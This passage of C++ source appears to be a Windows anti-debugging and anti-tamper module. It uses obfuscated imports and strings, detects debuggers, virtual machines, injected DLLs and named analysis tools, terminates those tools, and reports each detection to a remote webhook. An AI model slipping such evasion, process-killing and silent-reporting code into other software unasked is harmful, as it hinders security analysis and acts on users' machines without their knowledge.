    LI_FN(WinHttpSendRequest).cached()(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
    LI_FN(WinHttpReceiveResponse).cached()(hRequest, 0);
    LI_FN(WinHttpCloseHandle).cached()(hRequest);
    LI_FN(WinHttpCloseHandle).cached()(hConn);
    LI_FN(WinHttpCloseHandle).cached()(hSess);
}

// ============================================================
//  Scan Loops
// ============================================================

inline void ProcessScanLoop() {
    while (g_protection_active.load(std::memory_order_relaxed)) {
        std::string procs = BlacklistedProcessesPresent();
        if (!procs.empty()) {
            WebhookReport(_xor_("Blacklisted process"), _xor_("Process name scan"));
            ErrorHandler(_xor_("Blacklisted processes detected:\n\n") + procs, ErrorSeverity::Log);
        }
        if (LI_FN(FindWindowW).cached()(0, L"IDA: Quick start") ||
            LI_FN(FindWindowW).cached()(0, L"Memory Viewer") ||
            LI_FN(FindWindowW).cached()(0, L"Process List") ||
            LI_FN(FindWindowW).cached()(0, L"KsDumper") ||
            LI_FN(FindWindowW).cached()(0, L"HTTP Debugger") ||
            LI_FN(FindWindowW).cached()(0, L"OllyDbg") ||
            LI_FN(FindWindowW).cached()(0, L"FileGrab")) {
            WebhookReport(_xor_("Blacklisted window"), _xor_("Window title scan"));
            ErrorHandler(_xor_("Blacklisted window detected"), ErrorSeverity::Fatal);
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

inline void ProtectionThread() {
    int tick = 0;
    while (g_protection_active.load(std::memory_order_relaxed)) {
        if (IsDebuggerPresentApi() || RemoteDebuggerPresentApi() || NtGlobalFlagCheck() || DebugStringCheck()) {
            WebhookReport(_xor_("Debugger detected"), _xor_("IsDebuggerPresent/Remote/NtGlobalFlag/DebugString"));
            ErrorHandler(_xor_("Debugger present"), ErrorSeverity::Fatal);
        }
        if (HardwareBreakpointsDetected()) {
            WebhookReport(_xor_("Hardware breakpoint"), _xor_("DR0-DR3 set"));
            ErrorHandler(_xor_("Hardware breakpoints detected"), ErrorSeverity::Fatal);
        }
        if (KernelDebuggerDetected()) {
            WebhookReport(_xor_("Kernel debugger"), _xor_("SharedUserData KdDebuggerEnabled"));
            ErrorHandler(_xor_("Kernel debugger detected"), ErrorSeverity::Fatal);
        }
        if (tick % 5 == 0) {
            if (VmGuard::IsVm()) {
                WebhookReport(_xor_("Virtual machine"), _xor_("VM detection (hypervisor + vendor/MAC/BIOS)"));
                ErrorHandler(_xor_("Virtual machine detected"), ErrorSeverity::Fatal);
            }
            std::string blocked = BlockedProcessRunning();
            if (!blocked.empty()) {
                WebhookReport(_xor_("Known tool"), _xor_("Hash match (FileGrab/ProcessHacker/Injector/Everything)"));
                ErrorHandler(_xor_("Blocked tool detected:\n\n") + blocked, ErrorSeverity::Log);
            }
            std::string suspDlls = DetectSuspiciousDlls();
            if (!suspDlls.empty()) {
                WebhookReport(_xor_("DLL injection"), _xor_("Suspicious module in process"));
                ErrorHandler(_xor_("Suspicious DLLs loaded:\n\n") + suspDlls, ErrorSeverity::Log);
            }
            if (DetectManualMappedDll()) {
                WebhookReport(_xor_("Manual map"), _xor_("Manual mapped DLL"));
                ErrorHandler(_xor_("Manual mapped DLL detected"), ErrorSeverity::Fatal);
            }
        }
        tick++;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// ============================================================
//  Init
// ============================================================

inline void EarlyVmCheck() {
    if (VmGuard::IsVm()) {
        WebhookReport(_xor_("Virtual machine"), _xor_("VM check at startup"));
        ErrorHandler(_xor_("Virtual machine detected at startup"), ErrorSeverity::Fatal);
    }
}

inline void EarlyDebugCheck() {
    TerminateBlacklistedTools();
    HideThreadFromDebugger();
    PatchAntiAttach();

    if (IsDebuggerPresentApi() || RemoteDebuggerPresentApi() || NtGlobalFlagCheck() || DebugStringCheck()) {
        WebhookReport(_xor_("Debugger"), _xor_("Early startup check"));
        ErrorHandler(_xor_("Debugger present at startup"), ErrorSeverity::Fatal);
    }
    if (HardwareBreakpointsDetected()) {
        WebhookReport(_xor_("Hardware breakpoints"), _xor_("DR registers at startup"));
        ErrorHandler(_xor_("Hardware breakpoints at startup"), ErrorSeverity::Fatal);
    }
    if (KernelDebuggerDetected()) {
        WebhookReport(_xor_("Kernel debugger"), _xor_("Kernel debugger at startup"));
        ErrorHandler(_xor_("Kernel debugger at startup"), ErrorSeverity::Fatal);
    }
}

inline void InitSecurity() {
    EarlyVmCheck();
    EarlyDebugCheck();

    //ErasePeHeader();
    PebAntiDump();

    std::thread(ProcessScanLoop).detach();
    std::thread(ProtectionThread).detach();
}